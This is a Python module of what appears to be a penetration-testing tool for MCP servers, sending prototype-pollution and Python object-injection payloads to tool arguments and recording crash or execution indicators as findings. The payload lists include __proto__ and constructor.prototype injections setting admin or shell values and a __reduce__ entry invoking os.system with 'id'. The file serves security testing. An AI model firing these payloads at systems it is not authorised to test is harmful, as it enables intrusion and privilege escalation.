"""Schema and prototype pollution tests.

Detection uses observable parser/type errors and RCE indicators from the same
response.  It never consults global detector state and never treats reflection
of ``__proto__`` as success.
"""
from __future__ import annotations

import json
import logging

from core.evidence import make_finding
from core.protocol import (
    ProtocolError,
    RequestTimeout,
    SafetyLimitExceeded,
    TransportError,
    content_summary,
    result_text,
)

logger = logging.getLogger("mcpwn.schema_pollution")

CRASH_INDICATORS = (
    "Maximum call stack size exceeded",
    "Cannot convert object to primitive value",
    "TypeError: Cannot read propert",
    "this.toString is not a function",
    "Recursive process.env",
    "RangeError: Maximum call stack",
)


class SchemaPollutionTest:
    """Test prototype/schema pollution behaviour."""

    PROTO_PAYLOADS = [
        {"__proto__": {"toString": "polluted"}},
        {"__proto__": {"valueOf": "polluted"}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"shell": "/bin/sh", "env": {"PATH": "/tmp"}}},
    ]
    PYTHON_PAYLOADS = [
        {"__class__": {"__init__": {"__globals__": {"admin": True}}}},
        {"__reduce__": ["os.system", ["id"]]},
        {"__dict__": {"_admin": True}},
        {"__builtins__": {"__import__": "os"}},
    ]
    NESTED_PAYLOADS = [
        {"a": {"b": {"c": {"__proto__": {"x": 1}}}}},
        {"config": {"__proto__": {"debug": True}}},
        {"settings": {"constructor": {"prototype": {"shell": True}}}},
    ]

    def __init__(self, pentester):
        self.pentester = pentester

    def run(self, tool):
        findings = []
        schema = tool.get("inputSchema", {}) or {}
        properties = schema.get("properties", {}) or {}
        for arg, spec in properties.items():
            if not isinstance(spec, dict):
                continue
            if spec.get("type") in ("object", None):
                findings.extend(self._test_pollution(tool, arg))
        findings.extend(self._test_root_pollution(tool))
        return findings

    def _test_pollution(self, tool, arg):
        findings = []
        payloads = (self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS +
                    self.NESTED_PAYLOADS)
        limit = self.pentester.policy.payload_limit()
        for payload in payloads[:limit]:
            try:
                response, _ = self.pentester.send(
                    "tools/call",
                    {"name": tool.get("name"), "arguments": {arg: payload}},
                    skip_analysis=True,
                )
            except (TransportError, ProtocolError, RequestTimeout,
                    SafetyLimitExceeded) as exc:
                logger.debug("schema probe failed: %s", exc)
                continue
            finding = self._finding(tool, payload, response, arg)
            if finding:
                findings.append(finding)
                break
        return findings

    def _test_root_pollution(self, tool):
        findings = []
        limit = self.pentester.policy.payload_limit()
        for payload in (self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS)[:limit]:
            try:
                response, _ = self.pentester.send(
                    "tools/call",
                    {"name": tool.get("name"), "arguments": payload},
                    skip_analysis=True,
                )
            except (TransportError, ProtocolError, RequestTimeout,
                    SafetyLimitExceeded) as exc:
                logger.debug("root pollution probe failed: %s", exc)
                continue
            finding = self._finding(tool, payload, response, None)
            if finding:
                finding["type"] = "ROOT_POLLUTION"
                finding["severity"] = "HIGH"
                findings.append(finding)
                break
        return findings

    def _finding(self, tool, payload, response, arg):
        text = result_text(response)
        rce = self.pentester.scan_response(response)
        if rce:
            return make_finding(
                "SCHEMA_POLLUTION",
                tool=tool.get("name"),
                arg=arg,
                payload=json.dumps(payload),
                severity="HIGH",
                confidence=65,
                evidence=[
                    "indicator: {}".format(rce[0].get("indicator", "")),
                    content_summary(response, 300),
                ],
                note="pollution payload produced an execution indicator",
            )
        crashes = [marker for marker in CRASH_INDICATORS if marker in text]
        if crashes:
            return make_finding(
                "SCHEMA_POLLUTION",
                tool=tool.get("name"),
                arg=arg,
                payload=json.dumps(payload),
                severity="MEDIUM",
                confidence=45,
                evidence=[
                    "parser/type error: {}".format(crashes[0]),
                    content_summary(response, 300),
                ],
                note="type-coercion error; impact unverified",
            )
        return None
